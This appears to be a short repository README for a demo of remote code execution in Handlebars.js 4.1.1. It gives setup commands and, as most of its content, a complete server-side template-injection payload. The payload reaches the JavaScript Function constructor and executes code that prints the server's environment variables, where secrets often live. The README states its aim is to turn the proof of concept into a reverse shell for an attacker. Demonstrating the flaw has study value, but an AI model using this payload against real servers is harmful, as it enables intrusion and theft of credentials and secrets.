# Handlebars 4.1.1 RCE demo

This repository is intended to serve as a handlebars.js RCE demo. The goal is to try to figure out how this PoC code can be converted into a reverse shell for the attacker.

Inspired by this article:  
http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html

## Setup

```
npm i
node server.js
```

## POC

Use the following payload as a PoC:

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return JSON.stringify(process.env);"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```
